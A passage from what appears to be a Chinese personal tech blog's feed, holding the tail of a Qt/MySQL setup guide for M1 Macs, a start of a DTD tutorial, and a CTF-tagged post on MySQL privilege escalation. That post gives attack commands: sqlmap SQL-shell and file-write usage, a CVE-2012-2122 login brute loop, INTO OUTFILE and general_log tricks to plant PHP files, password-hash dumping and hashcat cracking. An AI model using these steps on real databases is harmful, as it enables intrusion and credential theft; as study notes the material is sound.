src="/../images/e6c9d24egy1h1ucjcdt7hj21dx0u00vy.png" alt="5"></p><h3 id="返回到Kits选择刚刚配置好的版本"><a href="#返回到Kits选择刚刚配置好的版本" class="headerlink" title="返回到Kits选择刚刚配置好的版本"></a>返回到Kits选择刚刚配置好的版本</h3><p>一般情况下这里的编译器(Compiler)都会自动检测到本机所带环境，不用更改</p><p><img src="/../images/e6c9d24egy1h1uckxzx6bj21n00u0q81.png" alt="6"></p><h3 id="新建一个项目"><a href="#新建一个项目" class="headerlink" title="新建一个项目"></a>新建一个项目</h3><p><img src="/../images/e6c9d24egy1h1ucm7hh0gj21ni0u076u.png" alt="7"></p><h3 id="选择模版"><a href="#选择模版" class="headerlink" title="选择模版"></a>选择模版</h3><p><img src="/../images/e6c9d24egy1h1ucmnslqlj21c60u0acl.png" alt="8"></p><h3 id="选择路径-不能带中文"><a href="#选择路径-不能带中文" class="headerlink" title="选择路径(不能带中文)"></a>选择路径(不能带中文)</h3><p><img src="/../images/e6c9d24egy1h1ucnji2ynj218g0tcwgp.png" alt="9"></p><h3 id="选择qmake"><a href="#选择qmake" class="headerlink" title="选择qmake"></a>选择qmake</h3><p><img src="/../images/e6c9d24egy1h1uco09mb9j218g0tcgn0.png" alt="10"></p><h3 id="剩下一直都点继续，直到Kits-选择刚刚配置的"><a href="#剩下一直都点继续，直到Kits-选择刚刚配置的" class="headerlink" title="剩下一直都点继续，直到Kits,选择刚刚配置的"></a>剩下一直都点继续，直到Kits,选择刚刚配置的</h3><p><img src="/../images/e6c9d24egy1h1ucp7tqxcj218g0tc76c.png" alt="11"></p><h3 id="构建项目"><a href="#构建项目" class="headerlink" title="构建项目"></a>构建项目</h3><p><img src="/../images/e6c9d24egy1h1ucpqyve4j218g0tcjtd.png" alt="12"></p><h3 id="运行项目，会自动生成一个默认的空白框"><a href="#运行项目，会自动生成一个默认的空白框" class="headerlink" title="运行项目，会自动生成一个默认的空白框"></a>运行项目，会自动生成一个默认的空白框</h3><p><img src="/../images/e6c9d24egy1h1ucr1dk8zj20tg0gqdgs.png" alt="."></p><p><img src="/../images/e6c9d24egy1h1ucrjmkltj20zu0si750.png" alt="."></p><blockquote><p>具体的使用可以去b站搜qt教程</p></blockquote><h2 id="Qt搭配mysql"><a href="#Qt搭配mysql" class="headerlink" title="Qt搭配mysql"></a>Qt搭配mysql</h2><h3 id="动态链接库下载"><a href="#动态链接库下载" class="headerlink" title="动态链接库下载"></a>动态链接库下载</h3><p>若要搭配mysql写项目，需要添加动态链接库<code>libqsqlmysql.dylib</code>，网上大部分教程都是下载qt源码进行编译，但由于M1是arm64架构，编译的过程会有很多报错以及路径不对的问题，网上能下载的动态链接库也大多不是arm架构的，因此不得不提到mac下的神器<code>homebrew</code>,终端执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install qt-mysql<br></code></pre></td></tr></table></figure><blockquote><p>brew会自动匹配下载最新qt版本的动态链接库，因此建议qt也使用homebrew安装</p></blockquote><p>进入目录<code>/opt/homebrew/Cellar/qt-mysql/6.2.3/share/qt/plugins/sqldrivers</code>将这个动态链接库放到<code>/opt/homebrew/Cellar/qt/6.2.3_1/share/qt/plugins/sqldrivers</code>中</p><p><img src="/../images/e6c9d24ely1h4xfpipwhjj21fg0okgng.png" alt="13"></p><blockquote><p>注意版本号对应</p></blockquote><h3 id="引入SQL模块"><a href="#引入SQL模块" class="headerlink" title="引入SQL模块"></a>引入SQL模块</h3><p>在项目的.pro文件的首行加上sql</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">QT       += core gui sql <span class="hljs-comment">//修改处</span><br><br><span class="hljs-built_in">greaterThan</span>(QT_MAJOR_VERSION, <span class="hljs-number">4</span>): QT += widgets<br><br>CONFIG += c++<span class="hljs-number">17</span><br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><h3 id="连接mysql数据库"><a href="#连接mysql数据库" class="headerlink" title="连接mysql数据库"></a>连接mysql数据库</h3><p>进入qt项目执行以下代码打印数据库驱动</p><p>mainwindow.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mainwindow.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ui_mainwindow.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QSqlDatabase&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QDebug&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QMessageBox&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;QSqlError&gt;</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-built_in">qDebug</span>()&lt;&lt;QSqlDatabase::<span class="hljs-built_in">drivers</span>();<span class="hljs-comment">//查看当前可用驱动</span><br></code></pre></td></tr></table></figure><blockquote><p>可用驱动中有QMYSQL即为成功</p><p><img src="/../images/e6c9d24ely1h4xg0zi3z4j20gk02yglv.png" alt="."></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">QSqlDatabase db=QSqlDatabase::<span class="hljs-built_in">addDatabase</span>(<span class="hljs-string">&quot;QMYSQL&quot;</span>);<span class="hljs-comment">//添加一个数据库</span><br>db.<span class="hljs-built_in">setHostName</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>);<span class="hljs-comment">//设置主机ip</span><br>db.<span class="hljs-built_in">setUserName</span>(<span class="hljs-string">&quot;username&quot;</span>);<span class="hljs-comment">//mysql数据库用户名</span><br>db.<span class="hljs-built_in">setPassword</span>(<span class="hljs-string">&quot;password&quot;</span>);<span class="hljs-comment">//密码</span><br>db.<span class="hljs-built_in">setDatabaseName</span>(<span class="hljs-string">&quot;db&quot;</span>);<span class="hljs-comment">//连接的数据库名</span><br><span class="hljs-keyword">if</span>(db.<span class="hljs-built_in">open</span>()==<span class="hljs-literal">false</span>)&#123;<span class="hljs-comment">//打开失败的警告</span><br>    QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;waring&quot;</span>,db.<span class="hljs-built_in">lastError</span>().<span class="hljs-built_in">text</span>());<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>运行项目只要没有警告框弹出就说明连接数据库成功</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac </tag>
            
            <tag> qt </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql提权</title>
      <link href="/2022/07/08/Mysql%E6%8F%90%E6%9D%83/"/>
      <url>/2022/07/08/Mysql%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ol><li><strong>具有MySQL的root权限，且MySQL以system权限运行。</strong></li><li><strong>具有执行SQL语句的权限。</strong></li></ol><p><strong>获取root密码的方法：</strong></p><ol><li><p>MySQL 3306 端口弱口令爆破</p></li><li><p>sqlmap 注入的 <code>--sql-shell</code> 模式</p><blockquote><p>使用条件:数据库开启了shell能执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u www.xxxx/aboutus.php?<span class="hljs-built_in">id</span>=1 --sql-shell<br></code></pre></td></tr></table></figure><p>进入了交互式页面，输入 select host,user,password from mysql.user这条命令，可以查询数据库的用户和密码</p></blockquote></li><li><p>网站的数据库配置文件中拿到明文密码信息</p></li><li><p>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</p><blockquote><p>Mysql 身份认证绕过漏洞（CVE-2012-2122）,当连接MariaDB&#x2F;MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说<u>只要知道用户名</u>，不断尝试就能够直接登入SQL数据库。官方说法是256次会成功一次</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 1 1000`; <span class="hljs-keyword">do</span> mysql -uroot -pwrong -h your-ip -P3306 ; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="Webshell权限"><a href="#Webshell权限" class="headerlink" title="Webshell权限"></a>Webshell权限</h2><h3 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h3><h4 id="写shell条件"><a href="#写shell条件" class="headerlink" title="写shell条件"></a>写shell条件</h4><ul><li>知道网站物理路径</li><li>高权限数据库用户</li><li>load_file() 开启 即 secure_file_priv 无限制</li><li>网站路径有写入权限</li></ul><p>首先基础语法查询是否 secure_file_priv 没有限制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_file_priv |       |<br>+------------------+-------+<br></code></pre></td></tr></table></figure><blockquote><p>不同value值对应</p><table><thead><tr><th align="left">Value</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">NULL</td><td align="left">不允许导入或导出</td></tr><tr><td align="left">&#x2F;tmp</td><td align="left">只允许在 &#x2F;tmp 目录导入导出</td></tr><tr><td align="left">空</td><td align="left">不限制目录</td></tr></tbody></table><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以<u>向任意绝对路径写文件</u></p><p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><p>若value为空，即不限制目录时，可以使用原生SQL语句来写shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>sqlmap中做法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://x.x.x.x/?id=x&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/guang/Desktop/shell.php&quot;</span> --file-dest=<span class="hljs-string">&quot;/var/www/html/test/shell.php&quot;</span><br></code></pre></td></tr></table></figure><h3 id="日志文件写shell"><a href="#日志文件写shell" class="headerlink" title="日志文件写shell"></a>日志文件写shell</h3><ul><li>Web 文件夹宽松权限可以写入</li><li>Windows 系统下</li><li>高权限运行 MySQL 或者 Apache</li></ul><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br>+------------------+---------------------------------+<br>| Variable_name    | Value                           |<br>+------------------+---------------------------------+<br>| general_log      | OFF                             |<br>| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="hljs-built_in">log</span> |<br>+------------------+---------------------------------+<br></code></pre></td></tr></table></figure><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更改日志文件位置</span><br><span class="hljs-built_in">set</span> global general_log = <span class="hljs-string">&quot;ON&quot;</span>;<br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;/var/www/html/info.php&#x27;</span>;<br><br><span class="hljs-comment"># 查看当前配置</span><br>mysql&gt; SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br>+------------------+-----------------------------+<br>| Variable_name    | Value                       |<br>+------------------+-----------------------------+<br>| general_log      | ON                          |<br>| general_log_file | /var/www/html/info.php |<br>+------------------+-----------------------------+<br><br><span class="hljs-comment"># 往日志里面写入 payload</span><br>select <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;<br><br><span class="hljs-comment"># 此时已经写到 info.php 文件当中了</span><br>root@c1595d3a029a:/var/www/html/$ <span class="hljs-built_in">cat</span> info.php <br>/usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with:<br>Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock<br>Time                 Id Command    Argument<br>201031 21:14:46       40 Query    SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span><br>201031 21:15:34       40 Query    select <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure><p>这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-rw-rw---- 1 mysql mysql 293 Oct 31 21:15 info.php<br></code></pre></td></tr></table></figure><p>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些，不过这里还是可以当做小知识点来学习记录。</p><h2 id="Hash-获取与解密"><a href="#Hash-获取与解密" class="headerlink" title="Hash 获取与解密"></a>Hash 获取与解密</h2><h3 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># MySQL &lt;= 5.6 版本</span><br>mysql&gt; select host, user, password from mysql.user;<br><br><span class="hljs-comment"># MySQL &gt;= 5.7 版本</span><br>mysql&gt; select host,user,authentication_string from mysql.user;<br></code></pre></td></tr></table></figure><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>在线网站来解密，如国内的 CMD5</p><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h21dwwaf21j214808y3ze.jpg" alt="img"></p><p>也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -a 0 -m 300 --force <span class="hljs-string">&#x27;8232A1298A49F710DBEE0B330C42EEC825D4190A&#x27;</span> password.txt -O<br></code></pre></td></tr></table></figure><p><strong>-a 破解模式</strong></p><p>指定要使用的破解模式，其值参考后面对参数</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-operator">-</span> <span class="hljs-punctuation">[</span> Attack Modes <span class="hljs-punctuation">]</span> <span class="hljs-operator">-</span><br><br>  <span class="hljs-comment"># | Mode</span><br> <span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-operator">+</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><br>  <span class="hljs-number">0</span> <span class="hljs-operator">|</span> Straight                <span class="hljs-comment"># 直接字典破解</span><br>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Combination             <span class="hljs-comment"># 组合破解</span><br>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Brute<span class="hljs-operator">-</span>force             <span class="hljs-comment"># 掩码暴力破解</span><br>  <span class="hljs-number">6</span> <span class="hljs-operator">|</span> Hybrid Wordlist <span class="hljs-operator">+</span> Mask  <span class="hljs-comment"># 字典+掩码破解</span><br>  <span class="hljs-number">7</span> <span class="hljs-operator">|</span> Hybrid Mask <span class="hljs-operator">+</span> Wordlist  <span class="hljs-comment"># 掩码+字典破解</span><br></code></pre></td></tr></table></figure><p><strong>-m 破解hash类型</strong></p><p>指定要破解的hash类型，后面跟hash类型对应的数字，具体类型详见下表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">12   | PostgreSQL                                       | Database Server<br>131  | MSSQL (2000)                                     | Database Server<br>132  | MSSQL (2005)                                     | Database Server<br>1731 | MSSQL (2012, 2014)                               | Database Server<br>200  | MySQL323                                         | Database Server<br>300  | MySQL4.1/MySQL5                                  | Database Server<br>...<br></code></pre></td></tr></table></figure><p><strong>–force</strong></p><p>忽略破解过程中的警告信息</p><p><strong>-O</strong></p><p><code>--optimized-kernel-enable</code> 启用优化的内核（限制密码长度</p><h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>用户通过自定义函数，使得在SQL语句中调用新函数</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> version();   # 获取数据库版本<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>();  # 获取数据库用户<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;   # 获取数据库安装目录<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> ‘<span class="hljs-operator">%</span>plugin<span class="hljs-operator">%</span>’; # 查看plugin路径。<br></code></pre></td></tr></table></figure><h3 id="动态链接库写入函数"><a href="#动态链接库写入函数" class="headerlink" title="动态链接库写入函数"></a>动态链接库写入函数</h3><ul><li><strong>sqlmap 的 UDF 动态链接库文件位置</strong>(sqlmap的动态链接库需要使用自带解码工具cloak.py解码)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap根目录/data/udf/mysql<br></code></pre></td></tr></table></figure><ul><li><strong>Metasploit 的 UDF 动态链接库文件位置</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSF 根目录/embedded/framework/data/exploits/mysql<br></code></pre></td></tr></table></figure><p>寻找插件目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show variables like <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>+---------------+------------------------------+<br>| Variable_name | Value                        |<br>+---------------+------------------------------+<br>| plugin_dir    | /usr/local/mysql/lib/plugin/ |<br>+---------------+------------------------------+<br></code></pre></td></tr></table></figure><p>写入动态数据库</p><p>坑，待补</p><h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:&#x2F;Windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DTD学习</title>
      <link href="/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</strong></p><p><strong>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</strong></p><h3 id="内部DOCTYPE声明"><a href="#内部DOCTYPE声明" class="headerlink" title="内部DOCTYPE声明"></a>内部DOCTYPE声明</h3><p>语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE 根元素 [元素声明]&gt;  &lt;!--根元素是xml文件的根元素--&gt;<br></code></pre></td></tr></table></figure><p>带有 DTD 的 XML 文档实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE note [<br>  &lt;!ELEMENT note (to,from,heading,body)&gt;<br>  &lt;!ELEMENT to      (#PCDATA)&gt;<br>  &lt;!ELEMENT from    (#PCDATA)&gt;<br>  &lt;!ELEMENT heading (#PCDATA)&gt;<br>  &lt;!ELEMENT body    (#PCDATA)&gt;<br>]&gt;<br>&lt;note&gt;<br>  &lt;to&gt;George&lt;/to&gt;<br>  &lt;from&gt;John&lt;/from&gt;<br>  &lt;heading&gt;Reminder&lt;/heading&gt;<br>  &lt;body&gt;Do not forget the meeting!&lt;/body&gt;<br>&lt;/note&gt;<br></code></pre></td></tr></table></figure><blockquote><h3 id="以上-DTD-解释如下："><a href="#以上-DTD-解释如下：" class="headerlink" title="以上 DTD 解释如下："></a>以上 DTD 解释如下：</h3><p><em>!DOCTYPE note</em> (第二行)定义此文档是 <em>note</em> 类型的文档。</p><p><em>!ELEMENT note</em> (第三行)定义 <em>note</em> 元素有四个元素：”to、from、heading,、body”</p><p><em>!ELEMENT to</em> (第四行)定义 <em>to</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT from</em> (第五行)定义 <em>from</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT heading</em> (第六行)定义 <em>heading</em> 元素为 “#PCDATA” 类型</p><p><em>!ELEMENT body</em> (第七行)定义 <em>body</em> 元素为 “#PCDATA” 类型</p></blockquote><h3 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h3><p>DTD位于XML源文件外部,语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;<br></code></pre></td></tr></table></figure><p>实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;<br>&lt;note&gt;<br>&lt;to&gt;George&lt;/to&gt;<br>&lt;from&gt;John&lt;/from&gt;<br>&lt;heading&gt;Reminder&lt;/heading&gt;<br>&lt;body&gt;Do not forget the meeting!&lt;/body&gt;<br>&lt;/note&gt; <br></code></pre></td></tr></table></figure><p>包含的note.dtd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT note (to,from,heading,body)&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;<br>&lt;!ELEMENT heading (#PCDATA)&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><h3 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h3><p>通过 DTD，每一个 XML 文件均可携带一个有关其自身格式的描述。</p><p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p><h2 id="构建模块"><a href="#构建模块" class="headerlink" title="构建模块"></a>构建模块</h2><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p><ul><li>元素</li><li>属性</li><li>实体</li><li>PCDATA </li><li>CDATA</li></ul><h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p>由闭合标签及内容(文本或空)构成</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>body text in between<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span>some message in between<span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>提供<em>有关元素的额外信息</em>。</p><p>元素为空时</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;computer.gif&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>元素有内容时</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">person</span> <span class="hljs-attr">sex</span>=<span class="hljs-string">&quot;female&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Anna<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span>Smith<span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">person</span>&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p><p><strong>下面的实体在 XML 中被预定义</strong></p><table><thead><tr><th align="left">实体引用</th><th align="left">字符</th></tr></thead><tbody><tr><td align="left"><code>&amp;lt;</code></td><td align="left">&lt;</td></tr><tr><td align="left"><code>&amp;gt;</code></td><td align="left">&gt;</td></tr><tr><td align="left"><code>&amp;amp;</code></td><td align="left">&amp;</td></tr><tr><td align="left"><code>&amp;quot;</code></td><td align="left">“</td></tr><tr><td align="left"><code>&amp;apos;</code></td><td align="left">‘</td></tr></tbody></table><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是会被解析的字符数据（parsed character 